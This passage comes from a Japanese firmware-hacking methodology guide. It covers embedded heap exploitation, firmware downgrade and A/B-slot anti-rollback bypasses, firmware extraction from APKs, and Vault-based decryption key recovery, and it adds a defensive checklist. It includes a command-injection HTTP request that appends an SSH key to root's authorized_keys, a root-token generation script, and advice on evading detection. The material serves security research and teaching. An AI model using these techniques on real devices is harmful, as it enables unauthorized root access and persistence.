脆弱な処理経路が commissioning logic の背後にある場合、malformed fragment を送信する前に、対象を想定される model-download または blob-download state に移行させるため、十分な **device emulation** が必要です。

### Protocol を利用した `free()` の誘発

Embedded daemon では、heap metadata exploitation を誘発する最も簡単な方法は「cleanup を待つ」ことではなく、**protocol 自体の error handling を強制する**ことです。<sup>[[8]](#references)</sup>

- 不正な後続 fragment を送り、FSM を **retry** または **error** state に移行させる。
- retry の上限を超過させ、daemon に **context を reset** させて破損した buffer を free させる。
- この予測可能な `free()` を利用し、無関係な理由で process が crash する前に allocator-side primitive を誘発する。

これは特に、embedded Linux の **musl/uClibc/dlmalloc-like** allocator に有効です。chunk metadata を破損させることで、unlink/unbin logic を write primitive に変えられる場合があります。安定した手法は、size field を破損させ、実際の bin pointer をすぐに上書きして process を crash させるのではなく、overflow した buffer 内に配置した **fake chunk** へ allocator traversal を誘導することです。

## Binary Exploitation と Proof-of-Concept

特定した脆弱性の PoC を開発するには、対象アーキテクチャへの深い理解と、低水準言語でのプログラミングが必要です。Embedded system では binary runtime protection はまれですが、実装されている場合は Return Oriented Programming (ROP) などの手法が必要になることがあります。

### uClibc fastbin exploitation の注意点 (embedded Linux)

- **Fastbin と consolidation:** uClibc は glibc と同様の fastbin を使用します。後続の大きな allocation によって `__malloc_consolidate()` が呼び出される可能性があるため、fake chunk は検証を通過する必要があります（妥当な size、`fd = 0`、および周囲の chunk が「使用中」と判断されること）。<sup>[[6]](#references)</sup>
- **ASLR 下の non-PIE binary:** ASLR が有効でも、メイン binary が **non-PIE** なら、binary 内の `.data/.bss` address は安定しています。有効な heap chunk header に似た領域を狙い、fastbin allocation を **function pointer table** に配置できます。
- **parser を停止させる NUL:** JSON の parse 時に payload 内の `\x00` を使うと、後続の attacker-controlled byte を stack pivot/ROP chain 用に残したまま parse を停止できます。
- **`/proc/self/mem` による shellcode:** `open("/proc/self/mem")`、`lseek()`、`write()` を呼び出す ROP chain を使うと、既知の mapping に実行可能な shellcode を書き込み、そこへ jump できます。

## Firmware Analysis 用に準備された Operating System

[AttifyOS](https://github.com/adi0x90/attifyos) や [EmbedOS](https://github.com/scriptingxss/EmbedOS) などの operating system は、firmware security testing に必要な tool を備えた、事前設定済みの環境を提供します。

## Firmware Analysis 用の準備済み OS

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS は、Internet of Things (IoT) device の security assessment と penetration testing を支援するための distro です。必要な tool をすべて読み込んだ事前設定済みの環境を提供し、作業時間を大幅に短縮します。
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): firmware security testing tool があらかじめ読み込まれた、Ubuntu 18.04 ベースの embedded security testing operating system です。

## Firmware Downgrade Attack と Insecure Update Mechanism

vendor が firmware image の cryptographic signature check を実装していても、**version rollback（downgrade）保護は省略されていることがよくあります**。boot または recovery loader が埋め込み済みの public key で signature を検証するだけで、書き込む image の *version*（または monotonic counter）を比較しない場合、攻撃者は**有効な signature が付いた古い脆弱な firmware**を正規の手順でインストールし、修正済みの脆弱性を再び持ち込むことができます。<sup>[[4]](#references)</sup>

典型的な攻撃の流れ:

1. **古い署名済み image を入手する**
   * vendor の公開 download portal、CDN、または support site から取得する。
   * companion mobile/desktop application から抽出する（例: Android APK 内の `assets/firmware/`）。
   * VirusTotal、Internet archive、forum などの third-party repository から取得する。
2. 公開されている update channel を使い、image を device に **upload または配信する**:
   * Web UI、mobile-app API、USB、TFTP、MQTT など。
   * 多くの consumer IoT device は、Base64 encoded firmware blob を受け取り、server 側で decode して recovery/upgrade を開始する、*unauthenticated* な HTTP(S) endpoint を公開しています。
3. downgrade 後、新しい release で修正された脆弱性（例: 後から追加された command-injection filter）を exploit する。
4. 必要に応じて、persistence を獲得した後に検知を避けるため、最新 image を再度 flash するか、update を無効化する。

### 例: Downgrade 後の Command Injection

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

脆弱な（ダウングレードされた）ファームウェアでは、`md5` パラメーターがサニタイズされずにシェルコマンドへ直接連結されるため、任意のコマンドをインジェクションできます（ここでは SSH キーベースの root アクセスを有効化）。後のファームウェアバージョンでは基本的な文字フィルターが導入されましたが、ダウングレード保護がないため、この修正は意味をなしません。<sup>[[4]](#references)</sup>

### モバイルアプリからのファームウェア抽出

多くのベンダーは、Bluetooth/Wi-Fi 経由でアプリからデバイスを更新できるよう、コンパニオンモバイルアプリに完全なファームウェアイメージを同梱しています。これらのパッケージは、`assets/fw/` や `res/raw/` などのパスにある APK/APEX 内に、暗号化されずに保存されていることがよくあります。`apktool`、`ghidra`、あるいは単純な `unzip` などのツールを使えば、物理ハードウェアに触れることなく、署名済みイメージを取り出せます。<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### A/B slot設計におけるUpdaterのみのanti-rollback bypass

一部のベンダーは、anti-downgrade **ratchet**を実装していますが、その処理は*updater*のロジック内（たとえば、CAN経由のUDSルーチン、recoveryコマンド、userspace OTA agent）に限られています。その後、**bootloader**がイメージのsignature/CRCだけを確認し、partition tableやslot metadataを信頼する場合、rollback protectionは依然としてbypassできます。<sup>[[7]](#references)</sup>

典型的な脆弱設計:

- Firmware metadataに、version descriptorと**security ratchet** / monotonic counterの両方が含まれる。
- Updaterは、イメージのratchetをpersistent storageに保存された値と比較し、古い署名済みイメージを拒否する。
- Bootloaderはそのratchetを解析せず、選択されたslotを起動する前にheader、CRC、signatureだけを検証する。
- Slotの有効化情報はpartition tableまたはslotごとのgeneration counterに別途保存され、検証済みのfirmware digestと暗号学的に**結び付けられていない**。

これにより、dual-slotシステムで**あるイメージを検証して別のイメージを起動する**primitiveが生まれます。攻撃者が、現在の署名済みイメージを使ってupdaterにslot Bを次回起動対象として設定させ、その後、再起動前にslot Bを上書きできる場合、bootloaderはすでに確定したslot metadataだけを信頼するため、古いイメージを起動する可能性があります。

よくある悪用パターン:

1. **現在の署名済み**firmwareを非アクティブslotにアップロードし、通常の検証／切り替えルーチンを実行して、そのslotが次のアクティブslotになるようlayoutを更新する。
2. **まだ再起動しない**。同じセッション内でslotの準備／消去ルーチンに再度入る。
3. 古いboot-stateやslot選択ロジックを悪用し、updaterに、昇格したばかりの**同じ物理slot**を消去させる。
4. **古いが署名は有効な**firmwareをそのslotに書き込む。
5. ratchetを強制する検証ルーチンをスキップし、直接再起動する。
6. Bootloaderは昇格済みslotを選び、signature/integrityだけを検証して古いイメージを起動する。

A/B update実装をreverseする際の確認事項:

- Slot選択が、切り替え成功後に更新されない**起動時フラグ**に基づいている。
- `prepare_passive_slot()`のようなルーチンが、**現在確定済みのlayout**ではなく古い状態に基づいてslotを消去する。
- `part_write_layout()`のような関数が、検証済みイメージのhashを保存せず、**generation counter** / active flagだけを更新する。
- Ratchetチェックがuserspaceまたはupdaterコードに実装されているが、ROM / bootloader / secure bootの各段階には実装されていない。
- 消去またはrecoveryルーチンが、slotの内容を削除して書き換えた後も、そのslotを起動可能としてマークしたままにする。

### Updateロジックの評価チェックリスト

* *update endpoint*の通信／認証は適切に保護されているか（TLS + authentication）？
* Flashing前に、デバイスは**version number**または**monotonic anti-rollback counter**を比較するか？
* イメージはsecure boot chain内で検証されるか（例: ROM codeによるsignatureチェック）？
* **Bootloaderはupdaterと同じratchetを強制するか**。それともsignature/CRCのチェックだけか？
* Slotの有効化metadataは、**検証済みfirmwareのdigest/versionに結び付けられているか**。それとも昇格後にslotを変更できるか？
* Slot切り替えの成功後、デバイスは強制的に再起動するか。それとも同じセッション内で後続のupdate/eraseルーチンを実行できるか？
* Userlandコードは追加のsanity check（例: 許可されたpartition map、model number）を行うか？
* *partial*または*backup* updateフローでも、同じ検証ロジックを再利用しているか？

> 💡  上記のいずれかが欠けている場合、そのプラットフォームはおそらくrollback attackに対して脆弱です。

## 練習用の脆弱なfirmware

Firmwareの脆弱性を見つける練習には、以下の脆弱なfirmwareプロジェクトを出発点として使用してください。

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Embedded KMS/Vault stateからfirmware decryption keyを復元する

Updateイメージに少量のplaintext metadataと大容量の高エントロピーblobが混在している場合は、何かをbrute-forceする前にコンテナをトリアージしてください:<sup>[[1]](#references)</sup>

- `hexdump`、`xxd`、`strings -tx`、`base64 -d`、`binwalk -E`を使って、header、offset、行の境界をダンプする。
- `Salted__`は通常、OpenSSL `enc`形式を示す。次の8 bytesがsaltで、残りのbytesがciphertext。
- デコード結果がちょうど`256` bytesのBase64 fieldは、ランダムなfirmware password/session keyを包むRSA-2048 ciphertextである可能性が高い。
- 同じファイル内のDetached PGP materialは、多くの場合、authenticityだけを保護する。これをconfidentialityの仕組みだと決めつけないこと。

静的なkey探索（`grep`、`strings`、PEM/PGP検索）で見つからない場合は、private keyを探すだけでなく、**実際の復号処理経路**をreverseしてください。

- Updater / management binaryをdecompileし、暗号化blobを読み込む箇所、復号を行うhelper/API、要求される論理key名を追跡する。
- 展開したroot filesystem内で、KMS state（`vault/`、`transit/`、`pkcs11`、`keystore`、`sealed-secrets`）とunit file、init scriptを検索する。
- 平文の`vault operator unseal ...`、recovery key、bootstrap token、ローカルKMS auto-unseal scriptは、private key materialと同等のものとして扱う。

Applianceに元のVault binaryとstorage backendが含まれている場合は、Vault内部を再実装するより、その環境を再現する方が通常は簡単です:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

クローンした KMS で root 権限を取得したら:

- transit key を隔離されたクローン内でのみ export 可能にする: `vault write transit/keys/<name>/config exportable=true`
- unwrap key を export する: `vault read transit/export/encryption-key/<name>`
- 復元した RSA key を、KMS が使用する正確な padding/hash の組み合わせで試す。PKCS#1 v1.5 による復号やデフォルトの OAEP による復号に失敗しても、key が間違っているとは限らない。Vault を利用する多くのフローでは SHA-256 を使う OAEP が使用される一方、一般的なライブラリのデフォルトは SHA-1 である。
- ペイロードが `Salted__` で始まる場合は、AES-CBC による復号を試す前に、ベンダーの OpenSSL KDF（`EVP_BytesToKey`。レガシー機器では MD5 が使われることが多い）を正確に再現する。

これにより「暗号化されたファームウェア」の解析は、より一般的な問題になる。すなわち、**アプライアンス側で使用される key を復元し、正確な unwrap + KDF パラメーターをオフラインで再現する**。

## トレーニングと資格認定

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Claude によるファームウェア解析: シニアレベルのスキル、ジュニアレベルの自律性](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [ファームウェアセキュリティテスト手法](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [実践 IoT ハッキング: Internet of Things を攻撃するための決定版ガイド](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [放置されたハードウェアの zero-day を悪用する – Trail of Bits ブログ](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [20 ドルのスマートデバイスから自宅へのアクセスを得た方法](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [今は見えている: 次は乗っ取り](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - 充電ポートコネクターから Tesla Wall Connector を悪用する - Part 2: anti-downgrade の回避](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [点滅させよう: Philips Hue Bridge の over-the-air exploitation](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [QEMU 上の Tesla OS で ROOT を取得する Part 1: 展開](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Linux kernel ドキュメント - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [QEMU 上の Tesla OS で ROOT を取得する Part 2: デバッグと修正](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Dell BIOS パスワード: 弱い XOR 暗号化により SPI Flash から復元可能 (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Dell BIOS パスワード復元ツール](https://github.com/R3n5k1/dellpwn)
{{#include ../../banners/hacktricks-training.md}}
